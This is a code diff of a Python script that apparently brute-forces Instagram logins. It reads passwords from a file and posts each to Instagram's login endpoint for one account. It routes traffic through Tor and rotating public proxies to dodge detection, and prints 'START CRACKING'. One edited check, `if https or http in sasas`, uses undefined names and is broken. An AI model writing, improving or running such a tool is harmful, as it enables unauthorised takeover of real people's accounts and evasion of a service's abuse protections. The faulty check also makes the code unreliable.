@@ -4,6 +4,7 @@ import argparse
 import logging
 import random
 import socket
+import socks
 import sys
 import threading
 import json
@@ -22,6 +23,9 @@ try:
     import Queue
 except ImportError:
     import queue as Queue
+
+
+ipcheck_url = 'http://checkip.amazonaws.com/'
 num = 1;
 proxies = {}
 def changeglobal():
@@ -40,14 +44,15 @@ class bcolors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
-
-
 def changeproxy():
     global proxies;
     ase = num
     khas = 1;
-    url = "https://api.getproxylist.com/proxy?protocol=http&?allowsPost=1"
-    r = requests.get(url,proxies={ 'https':'socks5h://localhost:9050','http':'socks5h://localhost:9050'})
+    proxies2 = {
+    'https': 'socks5h://127.0.0.1:9050'
+    }
+    url = "https://api.getproxylist.com/proxy?protocol=http&?allowsPost=1&?allowsRefererHeader=1&?allowsUserAgentHeader=1&?allowsCustomHeaders=1&?allowsCookies=1"
+    r = requests.get(url,proxies=proxies2)
     data = r.json()
     #rpox = ("%d:%d"%(data.ip,data.port))
     hma = str(data['ip'])
@@ -63,11 +68,12 @@ def changeproxy():
     sqqw = requests.get("https://api.ipify.org",proxies=proxies)
     sasa = "188.213.181.225";
     sasas = sqqw.content;
-    if sasa not in sasas:
+    if https or http in sasas:
         print(bcolors.OKGREEN+'ip changed')
     else:
         print('proxy not change tryagain')
         changeproxy()
+
 def get_csrf():
     """
     get CSRF token from login page to use in POST requests
@@ -116,6 +122,7 @@ def start_brute():
     }
     s = open("user.txt","r").readlines()
     asz = open("paired.txt","w+")
+    print(bcolors.OKGREEN+'START CRACKING ..... |+|')
     for line in s:
         password = line.strip()
         r = requests.post("https://www.instagram.com/accounts/login/ajax/",{"username":"sinatestcrack3","password":password},headers=header,proxies=proxies)
